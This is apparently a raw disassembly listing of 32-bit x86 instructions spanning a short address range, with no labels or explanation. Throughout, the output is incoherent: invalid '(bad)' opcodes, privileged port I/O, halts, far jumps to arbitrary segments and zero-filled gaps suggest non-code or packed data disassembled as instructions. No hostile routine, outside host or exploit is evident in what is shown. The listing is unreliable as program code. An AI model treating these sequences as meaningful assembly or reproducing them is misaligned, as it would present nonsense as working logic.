  41f024:	shr    DWORD PTR [edi],0x8a
  41f027:	fwait
  41f028:	imul   esp,DWORD PTR [edx+0x22cf0d1],0x34
  41f02f:	push   ebx
  41f030:	shl    esp,cl
  41f032:	mov    bh,0x4a
  41f034:	mov    cl,BYTE PTR [edx]
  41f036:	out    dx,al
  41f037:	jo     0x41f069
  41f039:	and    al,0x35
  41f03b:	into   
  41f03c:	cdq    
  41f03d:	ror    BYTE PTR [esp+ecx*1],0x2b
  41f041:	jne    0x41efc9
  41f043:	hlt    
  41f044:	sub    BYTE PTR [eax+0x5c],0xb1
  41f048:	cli    
  41f049:	pop    ebp
  41f04a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f04b:	adc    dl,BYTE PTR [eax+edi*2]
  41f04e:	(bad)  
  41f04f:	(bad)  
  41f050:	rcl    BYTE PTR [ebx+0x65],cl
  41f053:	lods   eax,DWORD PTR ds:[esi]
  41f054:	and    al,BYTE PTR [edx+0xa]
  41f057:	fadd   DWORD PTR [edi]
  41f059:	test   DWORD PTR [ebp-0x558f703d],edi
  41f05f:	push   cs
  41f060:	jl     0x41effd
  41f062:	mov    al,0xbd
  41f064:	stos   BYTE PTR es:[edi],al
  41f065:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f066:	jbe    0x41eff1
  41f068:	add    al,0x5b
  41f06a:	add    BYTE PTR [eax+0x63245232],bl
  41f070:	inc    edi
  41f071:	pop    ebp
  41f072:	cdq    
  41f073:	push   cs
  41f074:	in     al,0x6b
  41f076:	jmp    0x680b:0xc69048ff
  41f07d:	adc    ebx,edi
  41f07f:	mov    ch,0x25
  41f081:	retf   0x1ab0
  41f084:	call   0xf7bd9e13
  41f089:	push   eax
  41f08a:	xchg   ebp,eax
  41f08b:	ret    0xef8e
  41f08e:	sub    bh,BYTE PTR [edi]
  41f090:	xchg   ebx,eax
  41f091:	jb     0x41f0af
  41f093:	pushw  ss
  41f095:	rol    BYTE PTR [edx+0x6a],1
  41f098:	xchg   ebp,eax
  41f099:	dec    esi
  41f09a:	iret   
  41f09b:	mov    edx,0xe61863c9
  41f0a0:	inc    DWORD PTR [ecx-0x66566cbd]
  41f0a6:	ficomp WORD PTR [esi+0x60]
  41f0a9:	out    dx,al
  41f0aa:	sbb    edx,0xffffffc1
  41f0ad:	push   cs
  41f0ae:	pop    ds
  41f0af:	dec    esi
  41f0b0:	jmp    0x41f119
  41f0b2:	lea    edi,[ebx+ebx*4+0x20402c34]
  41f0b9:	cli    
  41f0ba:	jbe    0x41f055
  41f0bc:	(bad)  
  41f0bd:	into   
  41f0be:	pop    es
  41f0bf:	and    cl,BYTE PTR [eax]
  41f0c1:	je     0x41f115
  41f0c3:	jo     0x41f07f
  41f0c5:	leave  
  41f0c6:	jnp    0x41f0ab
  41f0c8:	ret    0xa76c
  41f0cb:	int    0x3c
  41f0cd:	push   es
  41f0ce:	cmp    al,0x6b
  41f0d0:	push   0x9a73f807
  41f0d5:	mov    esp,0x30708b61
  41f0da:	in     eax,0x54
  41f0dc:	push   ecx
  41f0dd:	push   es
  41f0de:	push   0xf51e100a
  41f0e3:	and    edx,ecx
  41f0e5:	push   ss
  41f0e6:	sbb    eax,0x696027c1
  41f0eb:	addr16 cld 
  41f0ed:	xlat   BYTE PTR es:[ebx]
  41f0ef:	jmp    0xf857493d
  41f0f4:	adc    al,0x79
  41f0f6:	pop    ebx
  41f0f7:	scas   eax,DWORD PTR es:[edi]
  41f0f8:	cdq    
  41f0f9:	retf   
  41f0fa:	pop    DWORD PTR [ecx-0x7fed79]
  41f100:	aaa    
  41f101:	(bad)  
  41f102:	clc    
  41f103:	jl     0x41f10a
  41f105:	inc    esp
  41f106:	stc    
  41f107:	dec    esp
  41f108:	pop    esp
  41f109:	aad    0xc6
  41f10b:	jmp    0x0:0xf65c5ad9
	...
  41f172:	add    BYTE PTR [eax],al
  41f174:	fild   QWORD PTR [edx+ebp*1+0x6c]
  41f179:	mov    ebx,0x3824ffdf
  41f17e:	(bad)  
  41f17f:	jmp    0x4ab8:0x7dea4e40
  41f186:	add    DWORD PTR [eax],eax
  41f188:	add    al,0x1
  41f18a:	add    BYTE PTR [eax],al
  41f18c:	push   edi
  41f18d:	sbb    eax,0x8d80e0e9
  41f192:	loope  0x41f1a1
  41f194:	or     esi,ecx
  41f196:	je     0x41f17d
  41f198:	aam    0x90
  41f19a:	mov    ds,WORD PTR [ecx-0x761dcc48]
  41f1a0:	(bad)  
  41f1a2:	mov    ecx,0xdea0984c
  41f1a7:	mov    ds:0xc36bd9f0,al
  41f1ac:	xchg   DWORD PTR [edx+0x2185598c],ebx
  41f1b2:	test   BYTE PTR [edx+edx*8-0x24d17a8c],dl
  41f1b9:	push   ebx
  41f1ba:	adc    DWORD PTR [edx],ebx
  41f1bc:	ja     0x41f1d0
  41f1be:	cs mov dh,0xfc
  41f1c1:	xor    cl,BYTE PTR [ebx-0x7e4261e6]
  41f1c7:	cmp    al,0x7f
  41f1c9:	pop    eax
  41f1ca:	out    dx,eax
  41f1cb:	aas    
  41f1cc:	jp     0x41f14e
  41f1ce:	push   ecx
  41f1cf:	mov    al,ds:0xc1cbd4a7
  41f1d4:	in     al,0x23
  41f1d6:	retf   0x15c3
  41f1d9:	mov    esi,0x83ee86b3
  41f1de:	xor    BYTE PTR [ebx+eax*8+0x36c8f712],ah
  41f1e5:	icebp  
  41f1e6:	xor    ax,0xa0c0
  41f1ea:	cmp    ebp,DWORD PTR [ebp-0x1a]
  41f1ed:	jb     0x41f204
  41f1ef:	sbb    bh,0x47
  41f1f2:	ret    0xcc4e
  41f1f5:	test   al,0xaf
  41f1f7:	shl    BYTE PTR [esi+0x7dd7e50f],0xe3
  41f1fe:	in     al,0x50
  41f200:	push   0xffffff92
  41f202:	xlat   BYTE PTR ds:[ebx]
  41f203:	adc    DWORD PTR [edi-0x6f],0xffffffb1
  41f207:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f208:	jmp    0xe3d2:0xb98f3bbd
  41f20f:	cdq    
  41f210:	clc    
  41f211:	push   ds
  41f212:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f213:	push   edi
  41f214:	outs   dx,DWORD PTR ds:[esi]
  41f215:	into   
  41f216:	das    
  41f217:	inc    eax
  41f218:	dec    edx
  41f219:	ss xchg ecx,eax
  41f21b:	lock test DWORD PTR [edx-0x46],ebx
  41f21f:	pushf  
  41f220:	push   esp
  41f221:	adc    al,0x5a
  41f223:	imul   esi
  41f225:	mov    WORD PTR [esi+0x45],ss
  41f228:	jb     0x41f1f5
  41f22a:	in     eax,0x5
  41f22c:	std    
  41f22d:	pop    edx
  41f22e:	gs ja  0x41f297
  41f231:	adc    edx,DWORD PTR [ebp+0x68388f51]
  41f237:	cmp    ecx,esp
  41f239:	outs   dx,DWORD PTR ds:[esi]
  41f23a:	sbb    DWORD PTR [eax],0x29
  41f23d:	(bad)  
  41f23e:	sar    ecx,1
  41f240:	es jle 0x41f267
  41f243:	repz add DWORD PTR [edi],0x7725ddf8
  41f24a:	std    
  41f24b:	sub    esp,DWORD PTR [edx+0x26]
  41f24e:	pop    ebx
  41f24f:	pusha  
  41f250:	and    eax,0x48b1d834
  41f255:	(bad)  
  41f256:	fadd   st,st(3)
  41f258:	mov    al,0x43
  41f25a:	mov    al,0x25
  41f25c:	out    dx,al
  41f25d:	hlt    
  41f25e:	inc    esp
  41f25f:	xor    ebx,DWORD PTR [edx]
  41f261:	retf   
  41f262:	jg     0x41f202
  41f264:	or     bl,al
  41f266:	jbe    0x41f2ad
  41f268:	push   0xffffff92
  41f26a:	fld    TBYTE PTR [esi]
  41f26c:	inc    esi
  41f26d:	fdiv   QWORD PTR [edi+0xc3a2595]
  41f273:	add    DWORD PTR [eax-0x40],ebp
  41f276:	mov    ah,0x5b
  41f278:	stos   BYTE PTR es:[edi],al
  41f279:	lock xchg edx,eax
  41f27b:	xchg   ebp,eax
  41f27c:	pushf  
  41f27d:	adc    ch,bh
  41f27f:	xchg   esi,eax
  41f280:	cdq    
  41f281:	or     DWORD PTR [ebp+0x17e02237],ebx
  41f287:	jnp    0x41f215
  41f289:	pop    esi
  41f28a:	test   DWORD PTR [ecx+0x7f],eax
  41f28d:	mov    al,ds:0x9ca9
	...
  41f2f2:	add    BYTE PTR [eax],al
  41f2f4:	push   ecx
  41f2f5:	sbb    edi,edi
  41f2f7:	jmp    si
  41f2fa:	fnstcw WORD PTR [edi]
  41f2fc:	jo     0x41f2eb
  41f2fe:	sahf   
  41f2ff:	jb     0x41f2be
  41f301:	shl    esp,0xdd
  41f304:	mov    esp,0x400014b
  41f309:	add    DWORD PTR [eax],eax
  41f30b:	add    BYTE PTR [ecx],dl
  41f30d:	test   BYTE PTR [edx],0x3d
  41f310:	loopne 0x41f343
  41f312:	jo     0x41f2fa
  41f314:	sbb    dh,BYTE PTR [edi+0x2a8a7543]
  41f31a:	dec    ah
  41f31c:	push   0x3cb2181a
  41f321:	imul   ecx,DWORD PTR [esi],0x2ccc4cb7
  41f327:	(bad)  
  41f328:	push   eax
  41f329:	icebp  
  41f32a:	sbb    eax,0xc72f05ef
  41f32f:	adc    ebx,DWORD PTR [edx-0x29]
  41f332:	stos   DWORD PTR es:[edi],eax
  41f333:	in     eax,dx
  41f334:	hlt    
  41f335:	popa   
  41f336:	test   al,0xdb
  41f338:	mov    eax,0xf434324a
  41f33d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f33e:	ret    0xe421
  41f341:	mov    ebp,0x71abb40d
  41f346:	dec    ecx
  41f347:	inc    edx
  41f348:	fldcw  WORD PTR [ebp+0x50]
  41f34b:	je     0x41f372
  41f34d:	add    BYTE PTR [ebx+ebx*2],bh
  41f350:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f351:	cmp    edx,DWORD PTR [ebx+0xf]
  41f354:	arpl   sp,dx
  41f356:	repz jnp 0x41f3c9
  41f359:	aas    
  41f35a:	ret    
  41f35b:	cmp    bh,BYTE PTR [ebp-0x61]
  41f35e:	sub    al,0xca
  41f360:	push   ecx
  41f361:	sub    esi,DWORD PTR [ebx]
  41f363:	sub    esi,DWORD PTR [esi+0x72]
  41f366:	cwde   
  41f367:	lahf   
  41f368:	ret    
  41f369:	pop    edi
  41f36a:	aad    0xca
  41f36c:	ins    BYTE PTR es:[edi],dx
  41f36d:	sbb    DWORD PTR [ebx*8+0x2034a5c3],eax
  41f374:	daa    
  41f375:	popa   
  41f376:	pop    edi
  41f377:	or     al,0x63
  41f379:	add    eax,0xb5726611
  41f37e:	js     0x41f304
  41f380:	frstor [edi]
  41f382:	arpl   si,dx
  41f384:	jns    0x41f372
  41f386:	retf   0xcc9c
  41f389:	push   edx
  41f38a:	std    
  41f38b:	mov    ch,0x9d
  41f38d:	xlat   BYTE PTR ds:[ebx]
  41f38e:	daa    
  41f38f:	mov    ecx,0x231c57d8
  41f394:	mov    ebx,0x7e5533c5
  41f399:	fbstp  TBYTE PTR [edi-0x40144c73]
  41f39f:	inc    esp
  41f3a0:	mov    dl,0xfa
  41f3a2:	adc    al,BYTE PTR [edx+0xe]
  41f3a5:	ret    0x1fc
  41f3a8:	pop    ecx
  41f3a9:	rcl    edi,1
  41f3ab:	leave  
  41f3ac:	pop    edi
  41f3ad:	shl    BYTE PTR [eax],1
  41f3af:	imul   esi,DWORD PTR [edx+eax*4+0x38],0x1476549
  41f3b7:	sbb    DWORD PTR ds:[esi-0x2a],eax
  41f3bb:	imul   ebx,ecx,0x18
  41f3be:	(bad)  
  41f3bf:	(bad)  
  41f3c0:	inc    eax
  41f3c1:	test   al,0xaf
  41f3c3:	icebp  
  41f3c4:	dec    esi
  41f3c5:	xchg   esi,eax
  41f3c6:	add    bl,bl
  41f3c8:	cmp    eax,ebp
  41f3ca:	dec    eax
  41f3cb:	or     dl,dh
  41f3cd:	pop    esp
  41f3ce:	adc    al,cl
  41f3d0:	jl     0x41f3d0
  41f3d2:	int    0x65
  41f3d4:	cmc    
  41f3d5:	xor    DWORD PTR ds:0x14b23b71,esp
  41f3db:	xchg   ecx,eax
  41f3dc:	fisubr DWORD PTR [edx-0x27]
  41f3df:	jb     0x41f3c7
  41f3e1:	xlat   BYTE PTR ds:[ebx]
  41f3e2:	adc    eax,0xb60443c5
  41f3e7:	dec    edx
  41f3e8:	xor    eax,0xec91bb42
  41f3ed:	ror    DWORD PTR [ebp-0xf],cl
  41f3f0:	ja     0x41f41d
  41f3f2:	ficom  DWORD PTR [ebx+0xc6340a]
  41f3f8:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41f3fa:	shl    DWORD PTR [ecx-0x3e],cl
  41f3fd:	sbb    esi,DWORD PTR [ebx]
  41f3ff:	ret    0xe5b9
  41f402:	or     eax,0xafdac0be
  41f407:	xchg   ebx,eax
  41f408:	xor    DWORD PTR [eax-0x23],eax
  41f40b:	mov    bh,0x9f
  41f40d:	and    ebx,DWORD PTR [eax]
  41f40f:	xor    al,0x0
	...
  41f471:	add    BYTE PTR [eax],al
  41f473:	add    BYTE PTR [edi+eiz*8],bh
  41f476:	imul   ebp,edi,0xfffffffb
  41f479:	out    dx,eax
  41f47a:	mov    esp,0xd5fd13f7
  41f47f:	mov    ch,0x83
  41f481:	ret    
  41f482:	mov    fs,WORD PTR [eax]
  41f484:	ror    BYTE PTR [ecx+eax*1+0x0],0x4
  41f489:	add    DWORD PTR [eax],eax
  41f48b:	add    BYTE PTR [edi],bh
  41f48d:	sub    al,0xdb
  41f48f:	test   BYTE PTR [edi],0xde
  41f492:	test   eax,0x56664bef
  41f497:	cmp    ebx,esi
  41f499:	jb     0x41f4fb
  41f49b:	inc    ebx
  41f49c:	pop    eax
  41f49d:	push   esi
  41f49e:	std    
  41f49f:	mov    ebp,0x3ec41a6d
  41f4a4:	inc    eax
  41f4a5:	push   ds
  41f4a6:	xlat   BYTE PTR ds:[ebx]
  41f4a7:	fsub   QWORD PTR [ebx-0x40ce0a76]
  41f4ad:	daa    
  41f4ae:	sub    esi,DWORD PTR [edx-0x5b]
  41f4b1:	mov    ?,WORD PTR [esi+ecx*4-0x67]
  41f4b5:	sahf   
  41f4b6:	xchg   esp,eax
  41f4b7:	sahf   
  41f4b8:	mov    dh,0x1b
  41f4ba:	fcmovne st,st(2)
  41f4bc:	dec    edx
  41f4bd:	xlat   BYTE PTR ds:[ebx]
  41f4be:	add    BYTE PTR [edx-0x1a5f5f14],ch
  41f4c4:	cwde   
  41f4c5:	ds mov edi,0x9720237e
  41f4cb:	loopne 0x41f539
  41f4cd:	push   es
  41f4ce:	idiv   BYTE PTR [edx]
  41f4d0:	dec    eax
  41f4d1:	adc    eax,0xc37fc3dd
  41f4d6:	inc    edx
  41f4d7:	jp     0x41f4ad
  41f4d9:	icebp  
  41f4da:	loopne 0x41f4a9
  41f4dc:	lahf   
  41f4dd:	es out 0xe6,eax
  41f4e0:	mov    esp,0x6ff157f4
  41f4e5:	dec    edx
  41f4e6:	adc    bl,ch
  41f4e8:	jae    0x41f4d3
  41f4ea:	mov    cs,WORD PTR [esi]
  41f4ec:	cmp    ebx,eax
  41f4ee:	in     al,dx
  41f4ef:	push   ss
  41f4f0:	(bad)  
  41f4f1:	leave  
  41f4f2:	sti    
  41f4f3:	cmc    
  41f4f4:	cmp    ch,al
  41f4f6:	fild   WORD PTR [edi+edx*8]
  41f4f9:	or     eax,0x78d793e5
  41f4fe:	pop    esi
  41f4ff:	popf   
  41f500:	jo     0x41f4db
  41f502:	mov    dh,0x5
  41f504:	cmp    ch,BYTE PTR [ecx]
  41f506:	mov    al,0x6f
  41f508:	xchg   edx,eax
  41f509:	cs jmp 0x41f4d0
  41f50c:	xor    eax,0x5b017a10
  41f511:	pop    ebx
  41f512:	stos   DWORD PTR es:[edi],eax
  41f513:	sub    BYTE PTR [edi+0x6a],ch
  41f516:	dec    eax
  41f517:	jne    0x41f509
  41f519:	xlat   BYTE PTR ds:[ebx]
  41f51a:	add    ah,BYTE PTR [eax+ebx*8]
  41f51d:	mov    eax,0x73469d50
  41f522:	and    al,0x54
  41f524:	pop    ebx
  41f525:	retf   
  41f526:	or     edi,DWORD PTR [edi]
  41f528:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f529:	(bad)  
  41f52a:	inc    ebp
  41f52b:	add    bl,bl
  41f52d:	out    0xf1,al
  41f52f:	adc    al,0xd8
  41f531:	add    DWORD PTR [ecx],0x18
  41f534:	sub    al,0xa1
  41f536:	in     al,dx
  41f537:	adc    ch,al
  41f539:	daa    
  41f53a:	scas   al,BYTE PTR es:[edi]
  41f53b:	pop    ebp
  41f53c:	mov    ds:0xdd9f4982,eax
  41f541:	mov    ebp,0x43aa0fe8
  41f546:	mov    bh,0xd9
  41f548:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f549:	mov    edx,0x9c859bf4
  41f54e:	cmp    DWORD PTR ds:0x309eab59,ecx
  41f554:	(bad)  
  41f555:	pop    ds
  41f556:	inc    eax
  41f557:	cmp    BYTE PTR [edi-0x502fce85],cl
  41f55d:	into   
  41f55e:	and    al,0x95
  41f560:	cmp    al,0x59
  41f562:	aad    0x62
  41f564:	lahf   
  41f565:	loop   0x41f5b0
  41f567:	push   ss
  41f568:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f569:	(bad)  
  41f56a:	push   eax
  41f56b:	out    dx,al
  41f56c:	or     BYTE PTR [edx+ebp*1+0x41],dl
  41f570:	push   esi
  41f571:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f572:	sbb    esp,DWORD PTR [ebp-0x3f]
  41f575:	jl     0x41f50c
  41f577:	out    dx,al
  41f578:	sub    eax,0x75200b0e
  41f57d:	test   DWORD PTR [edx-0x32abccf],0x3bef3fe1
  41f587:	dec    esp
  41f588:	jmp    0xafb61ff
  41f58d:	cmp    eax,0xe3f0
	...
  41f5f2:	add    BYTE PTR [eax],al
  41f5f4:	js     0x41f62a
  41f5f6:	add    bh,bl
  41f5f8:	dec    esi
  41f5f9:	(bad)  
  41f5fa:	stc    
  41f5fb:	mov    bh,0xb7
  41f5fd:	jmp    0x440e:0x6ea6d422
  41f604:	les    ecx,FWORD PTR [ebp+0x1]
  41f607:	add    BYTE PTR [ecx+eax*1],al
  41f60a:	add    BYTE PTR [eax],al
  41f60c:	push   ecx
  41f60d:	mov    eax,ds:0x7847b229
  41f612:	shl    cl,cl
  41f614:	fcomi  st,st(6)
  41f616:	and    DWORD PTR [ebx+0x665247ca],edx
  41f61c:	or     al,ah
  41f61e:	inc    ecx
  41f61f:	cmc    
  41f620:	cdq    
  41f621:	cmp    DWORD PTR [ecx],esp
  41f623:	jle    0x41f670
  41f625:	fistp  WORD PTR [eax+0x7abe8524]
  41f62b:	xchg   edi,eax
  41f62c:	int3   
  41f62d:	scas   al,BYTE PTR es:[edi]
  41f62e:	jo     0x41f672
  41f630:	data16 jle 0x41f613
  41f633:	sub    ebx,DWORD PTR [edx+0x4454472]
  41f639:	cmp    DWORD PTR [edi-0x7de45562],ecx
  41f63f:	cmp    al,cl
  41f641:	jnp    0x41f5f6
  41f643:	popa   
  41f644:	loope  0x41f69c
  41f646:	adc    ch,0x3a
  41f649:	in     al,0x52
  41f64b:	add    DWORD PTR [ecx-0x1fdac744],ecx
  41f651:	adc    dl,dl
  41f653:	repz cmp edi,DWORD PTR fs:[ecx]
  41f657:	xor    bh,0x2c
  41f65a:	mov    DWORD PTR [edx-0x19],esi
  41f65d:	mul    ecx
  41f65f:	loop   0x41f6bb
  41f661:	aaa    
  41f662:	mov    bl,0x8a
  41f664:	jbe    0x41f6ab
  41f666:	retf   0xe620
  41f669:	adc    dl,BYTE PTR [esi-0x25]
  41f66c:	jnp    0x41f628
  41f66e:	add    edx,DWORD PTR [edx*8-0x9eced42]
  41f675:	fistp  DWORD PTR [edx+0x4b]
  41f678:	lods   al,BYTE PTR ds:[esi]
  41f679:	loopne 0x41f62a
  41f67b:	jmp    DWORD PTR [ebp+ecx*1-0x377e4fc4]
  41f682:	add    eax,0x8d871aa8
  41f687:	inc    eax
  41f688:	out    dx,eax
  41f689:	dec    ebx
  41f68a:	dec    ebx
  41f68b:	shl    BYTE PTR [ecx],cl
  41f68d:	test   BYTE PTR [eax],cl
  41f68f:	ret    
  41f690:	pop    esi
  41f691:	mov    esi,edx
  41f693:	in     eax,dx
  41f694:	inc    ebp
  41f695:	ins    DWORD PTR es:[edi],dx
  41f696:	push   ebp
  41f697:	outs   dx,BYTE PTR ds:[esi]
  41f698:	loope  0x41f62f
  41f69a:	push   ebx
  41f69b:	arpl   WORD PTR [esi],di
  41f69d:	cmp    eax,0x251056fe
  41f6a2:	arpl   WORD PTR [ebx],sp
  41f6a4:	aaa    
  41f6a5:	test   BYTE PTR [edx-0x24bfce7c],al
  41f6ab:	ror    BYTE PTR [eax],0xc3
  41f6ae:	push   esp
  41f6af:	in     eax,dx
  41f6b0:	add    cl,BYTE PTR [edx+0x4000e491]
  41f6b6:	mov    esi,eax
  41f6b8:	add    eax,0xfc43ab55
  41f6bd:	mov    ds:0xb92b35a0,eax
  41f6c2:	stos   DWORD PTR es:[edi],eax
  41f6c3:	mov    ah,ah
  41f6c5:	mov    edi,0xe0176408
  41f6ca:	inc    ecx
  41f6cb:	xchg   esi,eax
  41f6cc:	sahf   
  41f6cd:	scas   al,BYTE PTR es:[edi]
  41f6ce:	xchg   edx,eax
  41f6cf:	outs   dx,BYTE PTR fs:[esi]
  41f6d1:	inc    ecx
  41f6d2:	pop    ebx
  41f6d3:	xchg   ecx,eax
  41f6d4:	ret    0x88dd
  41f6d7:	mov    ebp,0xaed3e87c
  41f6dc:	dec    esi
  41f6dd:	push   esp
  41f6de:	sub    ah,BYTE PTR [ebx]
  41f6e0:	sbb    al,0xc1
  41f6e2:	dec    edi
  41f6e4:	dec    eax
  41f6e5:	rcl    dl,0x94
  41f6e8:	lock sbb al,0xe3
  41f6eb:	fidivr DWORD PTR [edi+0x34b5abaf]
  41f6f1:	call   ecx
  41f6f3:	ret    
  41f6f4:	push   0xffffffe7
  41f6f6:	arpl   bx,ax
  41f6f8:	enter  0x5aa8,0x9d
  41f6fc:	xchg   esp,eax
  41f6fd:	dec    edx
  41f6fe:	scas   al,BYTE PTR es:[edi]
  41f6ff:	(bad)  
  41f701:	jmp    0x702c3036
  41f706:	pushf  
  41f707:	adc    DWORD PTR [edx],eax
  41f709:	inc    ebx
  41f70a:	mov    ch,0x23
  41f70c:	add    al,0xa0
  41f70e:	(bad)  
  41f70f:	cmp    DWORD PTR [eax],eax
	...
  41f771:	add    BYTE PTR [eax],al
  41f773:	add    BYTE PTR [edx-0x5081dcc4],dl
  41f779:	jg     0x41f75a
  41f77b:	cld    
  41f77c:	call   0x9522:0x5f6c62d2
  41f783:	or     al,cl
  41f785:	dec    esi
  41f786:	add    DWORD PTR [eax],eax
  41f788:	add    al,0x1
  41f78a:	add    BYTE PTR [eax],al
  41f78c:	int    0xfd
  41f78e:	mov    DWORD PTR [edi],0x94ead752
  41f794:	inc    edi
  41f795:	dec    ebx
  41f796:	add    al,0xc7
  41f798:	push   esp
  41f799:	nop
  41f79a:	push   0xe8d52912
  41f79f:	jp     0x41f7d9
  41f7a1:	test   eax,0xd9dd787e
  41f7a6:	xchg   ebp,eax
  41f7a7:	inc    eax
  41f7a8:	rcr    edx,0xa1
  41f7ab:	imul   ecx,DWORD PTR [edx],0x56
  41f7ae:	xor    ecx,esi
  41f7b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7b1:	pop    ecx
  41f7b2:	imul   esp,DWORD PTR [eax+0x33],0xffffffb5
  41f7b6:	dec    DWORD PTR [edi+0x269b07d0]
  41f7bc:	pop    ds
  41f7bd:	jl     0x41f7d6
  41f7bf:	out    0xd6,eax
  41f7c1:	aad    0x8c
  41f7c3:	xor    bh,BYTE PTR [esi-0x2a]
  41f7c6:	je     0x41f7a8
  41f7c8:	test   al,0x87
  41f7ca:	dec    esp
  41f7cb:	mov    ecx,0x34528d49
  41f7d0:	sub    ecx,eax
  41f7d2:	jge    0x41f820
  41f7d4:	sub    cl,BYTE PTR ds:0xae1e5ed0
  41f7da:	cmp    eax,ebx
  41f7dc:	lahf   
  41f7dd:	fstp   DWORD PTR [ebx]
  41f7df:	mov    ds:0x836a2e7d,eax
  41f7e4:	ins    DWORD PTR es:[edi],dx
  41f7e5:	or     al,0x51
  41f7e7:	cmp    BYTE PTR [eax+0x1b],al
  41f7ea:	enter  0xcfb1,0x48
  41f7ee:	mov    cl,0x1f
  41f7f0:	imul   edi,edi,0x35
  41f7f3:	xor    DWORD PTR [ebx+0x118d712e],esp
  41f7f9:	and    al,0xae
  41f7fb:	mov    ch,0x33
  41f7fd:	xlat   BYTE PTR ds:[ebx]
  41f7fe:	repnz ds cdq 
  41f801:	mov    eax,ds:0xd58e683f
  41f806:	xor    edi,edi
  41f808:	test   ebp,eax
  41f80a:	jbe    0x41f7ee
  41f80c:	push   ss
  41f80d:	jmp    0xf69b:0x23df6b95
  41f814:	dec    ebx
  41f815:	out    0x42,al
  41f817:	sub    dh,BYTE PTR [ebx+0x12]
  41f81a:	cs mov ebx,0x95d376f7
  41f820:	loope  0x41f817
  41f822:	sbb    BYTE PTR [ecx+0x6d],al
  41f825:	pop    es
  41f826:	cmp    BYTE PTR [eax-0x40140d9b],al
  41f82c:	ins    DWORD PTR es:[edi],dx
  41f82d:	fldcw  WORD PTR [ebp-0x521d2cb]
  41f833:	sub    BYTE PTR [edx],al
  41f835:	(bad)  
  41f836:	or     edi,DWORD PTR cs:[ebp+0x63]
  41f83a:	sbb    dh,al
  41f83c:	cmp    eax,0xbcf718b1
  41f841:	ss push edx
  41f843:	repz pop edx
  41f845:	inc    eax
  41f846:	cmp    eax,0x3b00d6d0
  41f84b:	sub    DWORD PTR [esp+0x38],esi
  41f84f:	cmp    dh,BYTE PTR ds:0x6de4bb0e
  41f855:	jb     0x41f8d6
  41f857:	sbb    al,0xda
  41f859:	or     edi,DWORD PTR [esi+0x4e96db31]
  41f85f:	mov    esi,edx
  41f861:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f862:	ficom  WORD PTR [esi]
  41f864:	cmp    eax,0x3e9814ab
  41f869:	mov    cl,0xb8
  41f86b:	mov    al,0xb3
  41f86d:	fild   WORD PTR [ecx-0xd]
  41f870:	mov    eax,ds:0x7c9a6529
  41f875:	aam    0xbf
  41f877:	retf   
  41f878:	ja     0x41f8d2
  41f87a:	pop    esi
  41f87b:	stc    
  41f87c:	inc    edx
  41f87d:	mov    ecx,0x8dd5df58
  41f882:	in     eax,dx
  41f883:	bound  eax,QWORD PTR [edi*2+0x2e55e0cc]
  41f88a:	push   ebx
  41f88b:	nop
  41f88c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f88d:	add    esp,esi
  41f88f:	rol    DWORD PTR [eax],0x0
	...
  41f8f2:	add    BYTE PTR [eax],al
  41f8f4:	mov    eax,ds:0x3b920b9a
  41f8f9:	xchg   ebx,eax
  41f8fa:	mov    ecx,0x4183febb
  41f8ff:	pop    edx
  41f900:	sbb    BYTE PTR [edi+0x4fcc5f40],dh
  41f906:	add    DWORD PTR [eax],eax
  41f908:	add    al,0x1
  41f90a:	add    BYTE PTR [eax],al
  41f90c:	mov    dl,cl
  41f90e:	repnz mov ebp,0xc75910eb
  41f914:	aam    0xba
  41f916:	mov    cs,ebp
  41f918:	sbb    dh,BYTE PTR [ecx]
  41f91a:	lds    ebx,FWORD PTR [eax]
  41f91c:	aas    
  41f91d:	out    dx,eax
  41f91e:	je     0x41f8cf
  41f920:	cwde   
  41f921:	shl    DWORD PTR [esi+0x683b9f15],cl
  41f927:	cs ins BYTE PTR es:[edi],dx
  41f929:	xchg   ecx,eax
  41f92a:	loop   0x41f8e7
  41f92c:	repnz rol DWORD PTR [edx],1
  41f92f:	adc    bh,0xbf
  41f932:	push   ds
  41f933:	(bad)  
  41f934:	in     eax,dx
  41f935:	jmp    0x69694337
  41f93a:	or     edi,DWORD PTR [ebx-0x3de19588]
  41f940:	sbb    dh,BYTE PTR [esi-0x18ce84aa]
  41f946:	rol    BYTE PTR [ecx-0x25745902],1
  41f94c:	mov    BYTE PTR [ebx],dh
  41f94e:	shl    BYTE PTR [edx-0x2e813462],cl
  41f954:	xor    DWORD PTR [ebx+eax*1],edi
  41f957:	pushf  
  41f958:	pop    ebx
  41f959:	call   DWORD PTR [edi]
  41f95b:	stos   DWORD PTR es:[edi],eax
  41f95c:	mov    ah,BYTE PTR [edi]
  41f95e:	inc    edx
  41f95f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f960:	sbb    edi,0x2
  41f963:	cmc    
  41f964:	adc    al,0x23
  41f966:	out    0x3e,al
  41f968:	or     al,0xad
  41f96a:	shr    DWORD PTR [ecx-0x49e04c4e],cl
  41f970:	call   0xf9cf:0x1a3e535f
  41f977:	mov    esp,0xd704410d
  41f97c:	adc    dl,BYTE PTR [eax]
  41f97e:	sub    esi,DWORD PTR [ebx]
  41f980:	outs   dx,BYTE PTR ds:[esi]
  41f981:	and    al,0x8f
  41f983:	sub    DWORD PTR ds:0x843d9dc0,ebp
  41f989:	icebp  
  41f98a:	outs   dx,BYTE PTR ds:[esi]
  41f98b:	stos   BYTE PTR es:[edi],al
  41f98c:	stos   BYTE PTR es:[edi],al
  41f98d:	mov    al,0xec
  41f98f:	out    dx,eax
  41f990:	adc    al,0xd8
  41f992:	popaw  
  41f994:	push   edi
  41f995:	int    0x28
  41f997:	into   
  41f998:	mov    eax,0xada4cd68
  41f99d:	mov    edx,0x75e5aa29
